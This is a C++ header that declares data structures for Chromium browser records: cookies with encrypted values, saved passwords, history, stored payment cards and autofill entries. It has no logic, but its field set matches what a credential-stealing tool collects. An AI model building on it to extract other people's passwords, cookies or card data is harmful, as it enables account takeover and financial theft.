#pragma once
#include <string>

struct ChromiumCookie {
	std::string host_key;
	std::string name;
	std::string value;           //plaintext (legacy / unencrypted)
	std::string encrypted_value; //AES-GCM blob v10/v11 prefix
	std::string path;
	int64_t expires_utc;
	bool secure;
	bool http_only;
};

struct ChromiumPassword {
	std::string origin_url;
	std::string username_value;
	std::string encrypted_password_value;
};

struct ChromiumHistoryEntry {
	std::string url;
	std::string title;
	int visit_count;
	int64_t last_visit_time;
};

struct ChromiumCard {
	std::string name_on_card;
	int expiration_month;
	int expiration_year;
	std::string card_number_encrypted;
};

struct ChromiumAutofill {
	std::string name;
	std::string value;
	int count;
};